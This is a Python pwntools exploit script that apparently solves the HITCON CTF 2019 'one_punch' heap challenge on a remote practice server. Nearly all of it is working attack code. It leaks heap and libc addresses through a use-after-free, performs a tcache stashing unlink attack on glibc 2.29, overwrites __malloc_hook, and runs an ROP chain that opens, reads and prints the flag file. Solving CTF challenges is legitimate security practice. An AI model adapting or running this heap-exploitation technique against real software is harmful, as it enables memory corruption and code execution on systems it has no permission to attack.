from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 0

def debug_on():
	context.log_level = "debug"

g_fname = "hitcon_ctf_2019_one_punch"
g_elf = ELF(g_fname)
g_libcname = "/lib/x86_64-linux-gnu/libc-2.29.so"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote("node3.buuoj.cn", 27650)
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("> ", str(idx))

def new(idx, name):
	opt(1)
	sla("idx: ", str(idx))
	sa("hero name: ", name)

def edit(idx, name):
	opt(2)
	sla("idx: ", str(idx))
	sa("hero name: ", name)
	
def show(idx):
	opt(3)
	sla("idx: ", str(idx))

def delete(idx):
	opt(4)
	sla("idx: ", str(idx))
	
def backdoor(content):
	opt("50056")
	s(content)

def pwn():
	########################
	# leak libc & heap base	
	########################
	for i in range(7):
		new(0, 'a'*0x80)
		delete(0)
	show(0) # leak heap base from tcache
	ru("hero name: ")
	heap_base = u64(rl()[:-1].ljust(8, b'\0')) & 0xfffffffffffff000

	new(0, 'a'*0x80)
	new(1, 'a'*0x80)
	delete(0)
	show(0) # leak libc from smallbin 
	ru("hero name: ")
	libc_base = u64(rl()[:-1].ljust(8, b'\0')) - 0x1e4ca0
	g_libc.address = libc_base
	malloc_hook = g_libc.symbols["__malloc_hook"]
	
	log.success("heap@%#x\nlibc@%#x\n__malloc_hook@%#x", heap_base, libc_base, malloc_hook)

	# UAF: write __malloc_hook into tcache[0x220]
	new(0, 'a'*0x210)
	new(1, 'a'*0x210)
	delete(0)
	delete(1)
	edit(1,flat([malloc_hook, heap_base + 0x10])) 
	###############################
	# tcache stashing unlink attack
	###############################
	for i in range(6):
		new(0, 'a'*0xf0)
		delete(0)
	for i in range(7):
		new(1, 'a'*0x400)
		delete(1)
	
	new(0, 'a'*0x400) # ub1 to be split.
	new(1, 'a'*0x400) # prevent adjacent chunks consolidation.
	new(1, 'a'*0x400) # ub2 to be split.
	new(2, 'a'*0x400) # prevent chunk merge into top chunk.
	# split ub1, ub2 to generate the 1st 0x100 chunk.
	delete(0)
	new(0, 'a'*0x300) # chk1: the remainder was inserted into unsortedbin.
	delete(1) 
	new(0, 'a'*0x300) # split chk2, insert chk1 into smallbin.
	new(0, 'a'*0x400) # insert chk2 into smallbin.

	# UAF: chk2->bk = target_ptr - off(fd) = target_ptr - 0x10
	edit(1, flat(['a'*0x300, 0, 0x101, heap_base + (0x55555555c120 - 0x555555559000), heap_base + 0x1b]))

	# trigger stashing unlink
	new(2, 'a'*0xf0)
	
	###############################
	# write __malloc_hook with ROP.
	###############################
	heap_buf = heap_base + 0x990
	p_rsp = libc_base + 0x8cfd6 # add rsp, 0x48; ret
	p_rdi = libc_base + 0x26542 # pop rdi; ret
	p_rsi = libc_base + 0x26f9e # pop rsi; ret
	p_rdx = libc_base + 0x12bda6 # pop rdx; ret
	p_rax = libc_base + 0x47cf8 # pop rax; ret
	syscall = libc_base + 0xcf6c5 # syscall; ret
	backdoor("./flag")
	backdoor(p64(p_rsp))

	rop = flat([
		# open("./flag", 0, 0)
		p_rdi, heap_base + 0x990, 
		p_rsi, 0,
		p_rdx, 0,
		p_rax, 2,
		syscall,
		# read(3, heap_buf, 0x100)
		p_rdi, 3, # fd
		p_rsi, heap_buf,
		p_rdx, 0x100,
		p_rax, 0, # __NR_read
		syscall,
		# write(1, heap_buf, 0x100)
		p_rdi, 1, # fd, stdout
		p_rsi, heap_buf,
		p_rdx, 0x100,
		p_rax, 1, # __NR_write
		syscall
	])

	new(0, rop)
	
if ("__main__" == __name__):
	# debug_on()
	pwn()
	g_io.interactive("Leo^^$")

